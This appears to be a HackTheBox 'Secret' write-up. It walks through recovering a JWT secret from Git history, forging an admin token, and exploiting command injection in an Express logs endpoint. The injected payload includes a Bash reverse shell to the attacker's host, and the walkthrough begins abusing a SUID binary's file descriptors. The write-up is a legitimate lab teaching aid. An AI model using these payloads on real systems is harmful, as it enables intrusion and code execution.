---
title: HTB: Secret
url: https://0xdf.gitlab.io/2022/03/26/htb-secret.html
date: 2022-03-26T13:45:00+00:00
difficulty: Easy [20]
os: Linux
tags: hackthebox, htb-secret, ctf, nmap, jwt, pyjwt, express, feroxbuster, api, source-code, git, command-injection, pr-set-dumpable, suid, crash-dump, var-crash, appport-unpack, core-dump
---

![Secret](https://0xdfimages.gitlab.io/img/secret-cover.png)

To get a foothold on Secret, I’ll start with source code analysis in a Git repository to identify how authentication works and find the JWT signing secret. With that secret, I’ll get access to the admin functions, one of which is vulnerable to command injection, and use this to get a shell. To get to root, I’ll abuse a SUID file in two different ways. The first is to get read access to files using the open file descriptors. The alternative path is to crash the program and read the content from the crashdump.

## Box Info

| Name | [Secret](https://hackthebox.com/machines/secret)  [Secret](https://hackthebox.com/machines/secret) [Play on HackTheBox](https://hackthebox.com/machines/secret) |
| --- | --- |
| Release Date | [30 Oct 2021](https://twitter.com/hackthebox_eu/status/1506662225427243020) |
| Retire Date | 26 Mar 2022 |
| OS | Linux Linux |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for Secret |
| Radar Graph | Radar chart for Secret |
| First Blood User | 00:07:31[szymex73 szymex73](https://app.hackthebox.com/users/139466) |
| First Blood Root | 00:26:39[szymex73 szymex73](https://app.hackthebox.com/users/139466) |
| Creator | [z9fr z9fr](https://app.hackthebox.com/users/485024) |

## Recon

### nmap

`nmap` finds three open TCP ports, SSH (22), HTTP over NGINX (80), and HTTP Node (3000):

```

oxdf@hacky$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.120
Starting Nmap 7.80 ( https://nmap.org ) at 2021-10-26 11:39 EDT
Nmap scan report for 10.10.11.120
Host is up (0.11s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp

Nmap done: 1 IP address (1 host up) scanned in 7.83 seconds

oxdf@hacky$ nmap -p 22,80,3000 -sCV -oA scans/nmap-tcpscripts 10.10.11.120
Starting Nmap 7.80 ( https://nmap.org ) at 2021-10-26 11:42 EDT
Nmap scan report for 10.10.11.120
Host is up (0.11s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: DUMB Docs
3000/tcp open  http    Node.js (Express middleware)
|_http-title: DUMB Docs
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.86 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) version, the host is likely running Ubuntu 20.04 Focal.

### Website - TCP 80

#### Site

The site is called Dumb Docs, and it’s an documentation site:

![image-20211026115140182](https://0xdfimages.gitlab.io/img/image-20211026115140182.png)

There’s a mention of using JWT tokens for authentication. There’s also a link to download the source (`/download/files.zip`), which I’ll grab a copy of.

`/docs` has demos on how to do different things like create a user, register a user, etc all via various GET and POST requests:

[![image-20211026115240975](https://0xdfimages.gitlab.io/img/image-20211026115240975.png)](https://0xdfimages.gitlab.io/img/image-20211026115240975.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20211026115240975.png)

#### Tech Stack

The response headers show it is nginx, and the JavaScript framework, [Express](https://expressjs.com/):

```

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 04 Oct 2021 19:30:03 GMT
Content-Type: text/html; charset=utf-8
Connection: close
X-Powered-By: Express
ETag: W/"50f0-RKvUrC7mXaVbiUKK+AbBOImlNFI"
Content-Length: 20720

```

#### Directory Brute Force

I’ll run `feroxbuster` against the site:

```

oxdf@hacky$ feroxbuster -u http://10.10.11.120

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.3.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.120
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.3.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
301       10l       16w      183c http://10.10.11.120/download
200        1l       12w       93c http://10.10.11.120/api
301       10l       16w      179c http://10.10.11.120/assets
200      486l     1119w    20720c http://10.10.11.120/docs
301       10l       16w      195c http://10.10.11.120/assets/plugins
301       10l       16w      185c http://10.10.11.120/assets/js
301       10l       16w      193c http://10.10.11.120/assets/images
301       10l       16w      187c http://10.10.11.120/assets/css
301       10l       16w      213c http://10.10.11.120/assets/plugins/lightbox
200        1l       12w       93c http://10.10.11.120/API
301       10l       16w      211c http://10.10.11.120/assets/images/features
200      486l     1119w    20720c http://10.10.11.120/Docs
301       10l       16w      231c http://10.10.11.120/assets/plugins/lightbox/examples
301       10l       16w      223c http://10.10.11.120/assets/plugins/lightbox/dist
200       21l      170w     1079c http://10.10.11.120/assets/plugins/lightbox/LICENSE
200        1l       12w       93c http://10.10.11.120/Api
200      486l     1119w    20720c http://10.10.11.120/DOCS
[####################] - 6m    269991/269991  0s      found:17      errors:1174   
[####################] - 6m     29999/29999   83/s    http://10.10.11.120
[####################] - 6m     29999/29999   73/s    http://10.10.11.120/download
[####################] - 6m     29999/29999   72/s    http://10.10.11.120/assets
[####################] - 6m     29999/29999   73/s    http://10.10.11.120/assets/plugins
[####################] - 6m     29999/29999   73/s    http://10.10.11.120/assets/images
[####################] - 6m     29999/29999   73/s    http://10.10.11.120/assets/css
[####################] - 6m     29999/29999   73/s    http://10.10.11.120/assets/js
[####################] - 6m     29999/29999   74/s    http://10.10.11.120/assets/plugins/lightbox
[####################] - 6m     29999/29999   74/s    http://10.10.11.120/assets/images/features

```

Nothing there is too interesting beyond what the documentation already showed.

#### Get Token

Following the steps from the documentation, I’ll register and get logged in.

I’ll try to register the admin username, but names must be six characters long:

```

oxdf@hacky$ curl -d '{"name":"admin","email":"dfdfdfdf@secret.htb","password":"password"}' -X POST http://10.10.11.120/api/user/register -H 'Content-Type: Application/json'
"name" length must be at least 6 characters long

```

There’s also something checking email domains, and `.htb` isn’t valid:

```

oxdf@hacky$ curl -d '{"name":"0xdf0xdf","email":"dfdfdfdf@secret.htb","password":"password"}' -X POST http://10.10.11.120/api/user/register -H 'Content-Type: Application/json'
"email" must be a valid email

```

I am able to register my own name:

```

oxdf@hacky$ curl -d '{"name":"0xdf0xdf","email":"dfdfdfdf@secret.com","password":"password"}' -X POST http://10.10.11.120/api/user/register -H 'Content-Type: Application/json'
{"user":"0xdf0xdf"}

```

Now the `/api/user/login` API returns a token:

```

oxdf@hacky$ curl -d '{"email":"dfdfdfdf@secret.com","password":"password"}' -X POST http://10.10.11.120/api/user/login -H 'Content-Type: Application/json'
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTc4MjUzMzJjMmJhYjA0NDVjNDg0NjIiLCJuYW1lIjoiMHhkZjB4ZGYiLCJlbWFpbCI6ImRmZGZkZmRmQHNlY3JldC5jb20iLCJpYXQiOjE2MzUyNjM4Mjh9.rMfMsdYkfSbl4hr1RJFwY3qWfrA3LSWVlzUON_9EW_A

```

### Website - TCP 3000

As far as I can tell, everything on 3000 is the same as on 80, just without NGINX. The pages all look exactly the same. The headers are slightly different:

```

HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 12872
ETag: W/"3248-nFUp1XavqYRgAFgHenjOsSPQ/e4"
Date: Thu, 24 Mar 2022 11:26:19 GMT

```

The difference vs port 80 is this one is missing the line:

```

Server: nginx/1.18.0 (Ubuntu)

```

I suspect NGINX is just there to proxy for Express.

### Source Analysis

#### Token

I’ll unzip the source and give it a look. Because logging in gives a JWT, I’m particularly interesting in if the signing secret is in the source. If I can access that, I can sign my own JWT as whatever user I want.

A bit of poking around shows that `index.js` is the root of the application. It sets up the application and imports routes from various folders:

```

const express = require('express');
const app = express();
const mongoose = require('mongoose');
const dotenv = require('dotenv')
const privRoute = require('./routes/private')
const bodyParser = require('body-parser')

app.use(express.static('public'))
app.use('/assets', express.static(__dirname + 'public/assets'))
app.use('/download', express.static(__dirname + 'public/source'))

app.set('views', './src/views')
app.set('view engine', 'ejs')

// import routs 
const authRoute = require('./routes/auth');
const webroute = require('./src/routes/web')

dotenv.config();
//connect db 

mongoose.connect(process.env.DB_CONNECT, { useNewUrlParser: true }, () =>
    console.log("connect to db!")
);

//middle ware 
app.use(express.json());
app.use('/api/user',authRoute)
app.use('/api/', privRoute)
app.use('/', webroute)

app.listen(3000, () => console.log("server up and running"));

```

It’s using [dotenv](https://www.npmjs.com/package/dotenv), which loads environment variables from a `.env` file, which is present in the downloaded files:

```

DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
TOKEN_SECRET = secret

```

Unfortunately for me, the `TOKEN_SECRET` just says secret (it would be in `"` or `'` if it was an actual string).

`/routes/auth.js` has the different functions for registration and login. The `login` function uses `process.env.TOKEN_SECRET` to sign the JWT:

```

router.post('/login', async  (req , res) => {

    const { error } = loginValidation(req.body)
    if (error) return res.status(400).send(error.details[0].message);

    // check if email is okay 
    const user = await User.findOne({ email: req.body.email })
    if (!user) return res.status(400).send('Email is wrong');

    // check password 
    const validPass = await bcrypt.compare(req.body.password, user.password)
    if (!validPass) return res.status(400).send('Password is wrong');

    // create jwt 
    const token = jwt.sign({ _id: user.id, name: user.name , email: user.email}, process.env.TOKEN_SECRET )
    res.header('auth-token', token).send(token);

})

```

`/routes/verifytoken.js` uses it as well to verify a submitted token:

```

const jwt = require("jsonwebtoken");

module.exports = function (req, res, next) {
    const token = req.header("auth-token");
    if (!token) return res.status(401).send("Access Denied");

    try {
        const verified = jwt.verify(token, process.env.TOKEN_SECRET);
        req.user = verified;
        next();
    } catch (err) {
        res.status(400).send("Invalid Token");
    }
}

```

Without the secret, not much I can do there.

#### Git

The source contains a `.git` directory, which means this is a Git repository, which could include history on the files in the repo. `git log` will show the various commits:

```

oxdf@hacky$ git log --oneline 
e297a27 (HEAD -> master) now we can view logs from server 😃
67d8da7 removed .env for security reasons
de0a46b added /downloads
4e55472 removed swap
3a367e7 added downloads
55fe756 first commit

```

“remove .env for security reasons” is certainly interesting. `git show` ([docs](https://git-scm.com/docs/git-show)) will show the difference between the current commit and the previous:

```

oxdf@hacky$ git show 67d8da7
commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
Author: dasithsv <dasithsv@gmail.com>
Date:   Fri Sep 3 11:30:17 2021 +0530

    removed .env for security reasons

diff --git a/.env b/.env
index fb6f587..31db370 100644
--- a/.env
+++ b/.env
@@ -1,2 +1,2 @@
 DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
-TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
+TOKEN_SECRET = secret

```

The `-` in front of the line means that line is gone, and the `+` shows a new line. So this is showing that a long string was removes, and replaced with “secret”. It seems likely that I have the secret.

#### private.js

The `private.js` file has routes for admin things. `/priv` checks if the current token has admin privileges:

```

router.get('/priv', verifytoken, (req, res) => {
   // res.send(req.user)

    const userinfo = { name: req.user }

    const name = userinfo.name.name;
    
    if (name == 'theadmin'){
        res.json({
            creds:{
                role:"admin", 
                username:"theadmin",
                desc : "welcome back admin,"
            }
        })
    }
    else{
        res.json({
            role: {
                role: "you are normal user",
                desc: userinfo.name.name
            }
        })
    }
})

```

Admin privs are hardcoded for a user named “theadmin”.

Using the instructions from the docs, I’ll add my token to the `auth-header` header and try this endpoint:

```

oxdf@hacky$ curl -s 'http://10.10.11.120/api/priv' -H "auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTc4MjUzMzJjMmJhYjA0NDVjNDg0NjIiLCJuYW1lIjoiMHhkZjB4ZGYiLCJlbWFpbCI6ImRmZGZkZmRmQHNlY3JldC5jb20iLCJpYXQiOjE2MzUyNjM4Mjh9.rMfMsdYkfSbl4hr1RJFwY3qWfrA3LSWVlzUON_9EW_A" | jq .
{
  "role": {
    "role": "you are normal user",
    "desc": "0xdf0xdf"
  }
}

```

As expected, it shows I’m not an admin.

`/logs` is also interesting:

```

router.get('/logs', verifytoken, (req, res) => {
    const file = req.query.file;
    const userinfo = { name: req.user }
    const name = userinfo.name.name;
    
    if (name == 'theadmin'){
        const getLogs = `git log --oneline ${file}`;
        exec(getLogs, (err , output) =>{
            if(err){
                res.status(500).send(err);
                return
            }
            res.json(output);
        })
    }
    else{
        res.json({
            role: {
                role: "you are normal user",
                desc: userinfo.name.name
            }
        })
    }
})

```

It only works if the username is theadmin, but then it can fetch Git logs. The problem is that this code has a command injection vulnerability in it, as it builds a string with user input and then passes it to `exec`.

## Shell as dasith

### Forge JWT

#### Test Token

I got a JWT earlier, so I can use to test if this is still the secret in use on Secret. I like to use Python for this kind of thing, dropping into a Python shell by running `python3`. I’ll need PyJWT installed as well (`pip3 install pyjwt`).

First I’ll import the package and save my token in a variable named `token` and the secret in a variable named `secret` to make them easier to work with:

```

>>> import jwt
>>> token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTc4MjUzMzJjMmJhYjA0NDVjNDg0NjIiLCJuYW1lIjoiMHhkZjB4ZGYiLCJlbWFpbCI6ImRmZGZkZmRmQHNlY3JldC5jb20iLCJpYXQiOjE2MzUyNjM4Mjh9.rMfMsdYkfSbl4hr1RJFwY3qWfrA3LSWVlzUON_9EW_A'
>>> secret = 'gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE'

```

Now the `jwt.decode` function will decode the token if the secret is right (if this errors out saying an “algorithms” value is required, see [update below](#note-on-pyjwt-versions)):

```

>>> jwt.decode(token, secret)
{'_id': '617825332c2bab0445c48462', 'name': '0xdf0xdf', 'email': 'dfdfdfdf@secret.com', 'iat': 1635263828}

```

To show this only works if the secret is correct, I’ll change the last character of `secret` from “M” to “m” and try again. It throws an `InvalidSignatureError` exception:

```

>>> jwt.decode(token, secret[:-1]+'m')
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "/home/oxdf/.local/lib/python3.9/site-packages/jwt/api_jwt.py", line 119, in decode
    decoded = self.decode_complete(jwt, key, algorithms, options, **kwargs)
  File "/home/oxdf/.local/lib/python3.9/site-packages/jwt/api_jwt.py", line 90, in decode_complete
    decoded = api_jws.decode_complete(
  File "/home/oxdf/.local/lib/python3.9/site-packages/jwt/api_jws.py", line 149, in decode_complete
    self._verify_signature(signing_input, header, signature, key, algorithms)
  File "/home/oxdf/.local/lib/python3.9/site-packages/jwt/api_jws.py", line 236, in _verify_signature
    raise InvalidSignatureError("Signature verification failed")
jwt.exceptions.InvalidSignatureError: Signature verification failed

```

That means the secret is good!

#### Note on PyJWT Versions
*Update 2 April 2022*: Knightmare pinged to to say that `jwt.decode` was throwing errors when trying to decode the token. I was running PyJWT 1.7.1, and he had the most recent version, 2.3.0. In version 2.0.1, the [changelog](https://pyjwt.readthedocs.io/en/2.0.1/changelog.html#require-explicit-algorithms-in-jwt-decode-by-default) shows:

![image-20220402092806554](https://0xdfimages.gitlab.io/img/image-20220402092806554.png)

These two lines show the issue, and how to make this work. The server doesn’t need to be told the algorithm because it’s in the JWT itself. Still, for security reasons, you don’t want the user being able to dictate that, so making the server explicitly state the expected algorithm is good. To get around that, I can set ` verify\_signature `to` False` in the options:

```

>>> jwt.decode(token, secret, options={"verify_signature": False})
{'_id': '617825332c2bab0445c48462', 'name': '0xdf0xdf', 'email': 'dfdfdfdf@secret.com', 'iat': 1635263828}

```

Since the [usage examples](https://pyjwt.readthedocs.io/en/2.0.1/usage.html) show `algorithms` takes a list of algorithms, I could also guess that the algorithm is either “HS256” or “RS256” (the only two I’m aware of in use) and give it both:

```

>>> jwt.decode(token, secret, algorithms=["HS256", "RS256"])
{'_id': '617825332c2bab0445c48462', 'name': '0xdf0xdf', 'email': 'dfdfdfdf@secret.com', 'iat': 1635263828}

```

#### Create Token

I’ll note above that `jwt.decode()` returns a dictionary with the various data from the JWT. I’ll save that to `j`, and then change the name to theadmin and use `jwt.encode()` to create a new token from that dictionary:

```

>>> j = jwt.decode(token, secret)
>>> j['name'] = 'theadmin'
>>> jwt.encode(j, secret)
b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJfaWQiOiI2MTc4MjUzMzJjMmJhYjA0NDVjNDg0NjIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImRmZGZkZmRmQHNlY3JldC5jb20iLCJpYXQiOjE2MzUyNjM4Mjh9.cRgg1KkYXYSwz1xpknTFWTHnx8D-7UMewMubwAGsvQ8'

```

`/api/priv` confirms that this token has the admin role:

```

oxdf@hacky$ curl -s 'http://10.10.11.120/api/priv' -H "auth-token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJfaWQiOiI2MTc4MjUzMzJjMmJhYjA0NDVjNDg0NjIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImRmZGZkZmRmQHNlY3JldC5jb20iLCJpYXQiOjE2MzUyNjM4Mjh9.cRgg1KkYXYSwz1xpknTFWTHnx8D-7UMewMubwAGsvQ8" | jq .
{
  "creds": {
    "role": "admin",
    "username": "theadmin",
    "desc": "welcome back admin"
  }
}

```

### Command Injection

#### Theory

The code that I suspect will be vulnerable to command injection is:

```

if (name == 'theadmin'){
    const getLogs = `git log --oneline ${file}`;
    exec(getLogs, (err , output) =>{
        if(err){
            res.status(500).send(err);
            return
        }
        res.json(output);
    })
}

```

`exec` is a dangerous [command](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp/exec), as it will execute the given string. `${file}` is passed in as a parameter to `/api/logs`. With control over `${file}`, I can make `getLogs` into something like:

```

git log --oneline; [any command]

```

#### POC - ping

With access as theadmin, I’ll try the command injection from above. I’ll start `tcpdump` to listen for ICMP packets, and pass `file=;ping -c 1 10.10.14.6` (url encoded with `+` for space):

```

oxdf@hacky$ curl -s 'http://10.10.11.120/api/logs?file=;ping+-c+1+10.10.14.6' -H "auth-token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJfaWQiOiI2MTc4MjUzMzJjMmJhYjA0NDVjNDg0NjIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImRmZGZkZmRmQHNlY3JldC5jb20iLCJpYXQiOjE2MzUyNjM4Mjh9.cRgg1KkYXYSwz1xpknTFWTHnx8D-7UMewMubwAGsvQ8"
"80bf34c fixed typos 🎉\n0c75212 now we can view logs from server 😃\nab3e953 Added the codes\nPING 10.10.14.6 (10.10.14.6) 56(84) bytes of data.\n64 bytes from 10.10.14.6: icmp_seq=1 ttl=63 time=75.8 ms\n\n--- 10.10.14.6 ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss, time 0ms\nrtt min/avg/max/mdev = 75.768/75.768/75.768/0.000 ms\n"

```

The result include the `ping` output after the `git log` output! I can make it print prettier using `jq -r .`, which will take JSON input (a plain string is valid JSON) and remove the formatting to make it raw:

```

oxdf@hacky$ curl -s 'http://10.10.11.120/api/logs?file=;ping+-c+1+10.10.14.6' -H "auth-token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJfaWQiOiI2MTc4MjUzMzJjMmJhYjA0NDVjNDg0NjIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImRmZGZkZmRmQHNlY3JldC5jb20iLCJpYXQiOjE2MzUyNjM4Mjh9.cRgg1KkYXYSwz1xpknTFWTHnx8D-7UMewMubwAGsvQ8" | jq -r .
80bf34c fixed typos 🎉
0c75212 now we can view logs from server 😃
ab3e953 Added the codes
PING 10.10.14.6 (10.10.14.6) 56(84) bytes of data.
64 bytes from 10.10.14.6: icmp_seq=1 ttl=63 time=104 ms
--- 10.10.14.6 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 103.897/103.897/103.897/0.000 ms

```

The results of the ping come back showing it worked! I can also see the connection at `tcpdump`:

```

oxdf@hacky$ sudo tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
12:04:53.974591 IP 10.10.11.120 > 10.10.14.6: ICMP echo request, id 1, seq 1, length 64
12:04:53.974607 IP 10.10.14.6 > 10.10.11.120: ICMP echo reply, id 1, seq 1, length 64

```

#### POC - id

Given that the output comes back (the command injection is not blind), I can test other commands as well, like `id`:

```

oxdf@hacky$ curl -s 'http://10.10.11.120/api/logs?file=;id' -H "auth-token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJfaWQiOiI2MTc4MjUzMzJjMmJhYjA0NDVjNDg0NjIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImRmZGZkZmRmQHNlY3JldC5jb20iLCJpYXQiOjE2MzUyNjM4Mjh9.cRgg1KkYXYSwz1xpknTFWTHnx8D-7UMewMubwAGsvQ8" | jq -r .
80bf34c fixed typos 🎉
0c75212 now we can view logs from server 😃
ab3e953 Added the codes
uid=1000(dasith) gid=1000(dasith) groups=1000(dasith)

```

I could write a small Python script here to keep enumerating via this RCE, but I’ll go for a shell first.

#### Shell

I’ll continue to use `curl`, but rather than putting the GET parameters right into the url, I’ll use `-G` to force a GET request, and `--data-urlencode` to have `curl` encode the data for me. Now I don’t have to worry about special characters, etc. I’ll start with a command I know works to make sure my syntax is correct:

```

oxdf@hacky$ curl -s -G 'http://10.10.11.120/api/logs' \
> --data-urlencode 'file=/dev/null;id' \
> -H "auth-token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJfaWQiOiI2MTc4MjUzMzJjMmJhYjA0NDVjNDg0NjIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImRmZGZkZmRmQHNlY3JldC5jb20iLCJpYXQiOjE2MzUyNjM4Mjh9.cRgg1KkYXYSwz1xpknTFWTHnx8D-7UMewMubwAGsvQ8" \
> | jq -r .
uid=1000(dasith) gid=1000(dasith) groups=1000(dasith)

```

Adding `/dev/null` before the `;` is not necessary, but it makes the `git log` command return nothing, so the output is just from my injection.

Now I can update that to a simple Bash reverse shell (and start `nc` listening in a new terminal):

```

oxdf@hacky$ curl -s -G 'http://10.10.11.120/api/logs' --data-urlencode "file=>/dev/null;bash -c 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1'" -H "auth-token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJfaWQiOiI2MTc4MjUzMzJjMmJhYjA0NDVjNDg0NjIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImRmZGZkZmRmQHNlY3JldC5jb20iLCJpYXQiOjE2MzUyNjM4Mjh9.cRgg1KkYXYSwz1xpknTFWTHnx8D-7UMewMubwAGsvQ8" | jq -r .

```

It just hangs, but at a listening `nc` there’s a shell as dasith:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.120 44874
bash: cannot set terminal process group (1093): Inappropriate ioctl for device
bash: no job control in this shell
dasith@secret:~/local-web$ id
uid=1000(dasith) gid=1000(dasith) groups=1000(dasith)

```

I’ll upgrade my shell with `script`:

```

dasith@secret:~/local-web$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
dasith@secret:~/local-web$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
dasith@secret:~/local-web$ 

```

And get `user.txt`:

```

dasith@secret:~$ cat user.txt
53744424************************

```

## Shell as root

### Enumeration

The home directory of dasith is pretty empty otherwise. Looking around the rest of the box, `/opt` has interesting files:

```

dasith@secret:/opt$ ls -l
total 32
-rw-r--r-- 1 root root  3736 Oct  7 10:01 code.c
-rwsr-xr-x 1 root root 17824 Oct  7 10:03 count
-rw-r--r-- 1 root root  4622 Oct  7 10:04 valgrind.log

```

`count` is a SUID binary, which means it will run as it’s owner regardless of who runs it. In this case, that user is root. Running it prompts for a filename:

```

dasith@secret:/opt$ ./count
Enter source file/directory name:

```

I’ll give it `root.txt`, and see what it learns:

```

dasith@secret:/opt$ ./count
Enter source file/directory name: /root/root.txt

Total characters = 33
Total words      = 2
Total lines      = 2
Save results a file? [y/N]: 

```

It’s doing a fancy word count on the given file (and adding an extra word and line?), and then prompting about saving to a file. If I say yes, it save these stats:

```

Save results a file? [y/N]: y
Path: /tmp/0xdf
dasith@secret:/opt$ cat /tmp/0xdf 
Total characters = 33
Total words      = 2
Total lines      = 2

```

Giving it a directory instead of a file, it prints the files in that directory and their permissions:

```

dasith@secret:/opt$ ./count       
Enter source file/directory name: /root
-rw-r--r--      .viminfo
drwxr-xr-x      ..
-rw-r--r--      .bashrc
drwxr-xr-x      .local
drwxr-xr-x      snap
lrwxrwxrwx      .bash_history
drwx------      .config
drwxr-xr-x      .pm2
-rw-r--r--      .profile
drwxr-xr-x      .vim
drwx------      .
drwx------      .cache
-r--------      root.txt
drwxr-xr-x      .npm
drwx------      .ssh

Total entries       = 15
Regular files       = 4
Directories         = 10
Symbolic links      = 1
Save results a file? [y/N]:

```

`code.c` is the source for this application:

```

#include <stdio.h>
#include <stdlib.h>          
#include <unistd.h>
#include <string.h>
#include <dirent.h>
#include <sys/prctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <linux/limits.h>

void dircount(const char *path, char *summary)
{
...[snip]...
}

void filecount(const char *path, char *summary)
{
...[snip]...
}

int main()
{
    char path[100];
    int res;
    struct stat path_s;
    char summary[4096];

    printf("Enter source file/directory name: ");
    scanf("%99s", path);
    getchar();
    stat(path, &path_s);
    if(S_ISDIR(path_s.st_mode))
        dircount(path, summary);
    else
        filecount(path, summary);

    // drop privs to limit file write
    setuid(getuid());
    // Enable coredump generation
    prctl(PR_SET_DUMPABLE, 1);
    printf("Save results a file? [y/N]: ");
    res = getchar();
    if (res == 121 || res == 89) {
        printf("Path: ");
        scanf("%99s", path);
        FILE *fp = fopen(path, "a");
        if (fp != NULL) {
            fputs(summary, fp);
            fclose(fp);
        } else {
            printf("Could not open %s for writing\n", path);
        }
    }

    return 0;
}

```

What’s especially interesting is that after getting the stats, it drops privs for file write by setting the `uid` to the result of `getuid`. With a SUID binary, this will be the actual userid of who ran the binary, in this case, dasith. This means I can’t use this to write in directories I can’t otherwise access.

This bit is interesting as well:

```

    // Enable coredump generation
    prctl(PR_SET_DUMPABLE, 1);

```

### Exploit File Descriptors

#### File Read in /root

The intended path to exploit this binary is to abuse the file descriptors in use by the `count` process. The issue in the source code is that it never closes `file`, which is the handle to the given filepath. That means that as long as the program is running, the handle will be in `/proc/[pid]/fd`. Typically this would be flushed on the `setuid`, but because of `PR_SET_DUMPABLE`, the file handles will stay open. To exploit this, I’ll run the program, and then background it when it gets to the prompt:

```

dasith@secret:/opt$ ./count 
Enter source file/directory name: /root/root.txt

Total characters = 33
Total words      = 2
Total lines      = 2
Save results a file? [y/N]: ^Z
[1]+  Stopped                 ./count

```

I’ll get the PID of the process, in this case 1536:

```

dasith@secret:/opt$ ps auxww | grep count
root         841  0.0  0.1 235676  7416 ?        Ssl  15:40   0:00 /usr/lib/accountsservice/accounts-daemon
dasith      1536  0.0  0.0   2488   584 pts/0    T    16:22   0:00 ./count
dasith      1538  0.0  0.0   6432   728 pts/0    S+   16:22   0:00 grep --color=auto count

```

In that folder, the `3` points to `root.txt`:

```

dasith@secret:/proc/1536/fd$ ls -l
total 0
lrwx------ 1 dasith dasith 64 Oct 26 16:23 0 -> /dev/pts/0
lrwx------ 1 dasith dasith 64 Oct 26 16:23 1 -> /dev/pts/0
lrwx------ 1 dasith dasith 64 Oct 26 16:23 2 -> /dev/pts/0
lr-x------ 1 dasith dasith 64 Oct 26 16:23 3 -> /root/root.txt

```

Unfortunately, I can’t read it still:

```

dasith@secret:/proc/1536/fd$ cat 3
cat: 3: Permission denied

```

This vulnerability doesn’t give me the ability to read as root. But it gives me access into a folder I can’t access. For example, the listing of `/root` is:

```
-rw-r--r--      .viminfo
drwxr-xr-x      ..
-rw-r--r--      .bashrc
drwxr-xr-x      .local
drwxr-xr-x      snap
lrwxrwxrwx      .bash_history
drwx------      .config
drwxr-xr-x      .pm2
-rw-r--r--      .profile
drwxr-xr-x      .vim
drwx------      .
drwx------      .cache
-r--------      root.txt
drwxr-xr-x      .npm
drwx------      .ssh

```

For example, take `/root/.profile`. This file permissions are `-rw-r--r--`, something any user can read. But because I can’t access `/root`, I still get denied from a normal read:

```

dasith@secret:/opt$ cat /root/.profile
cat: /root/.profile: Permission denied

```

That is because I don’t have permissions on `/root`, not because of the file itself.

If I try reading through `count`, the contents come back:

```

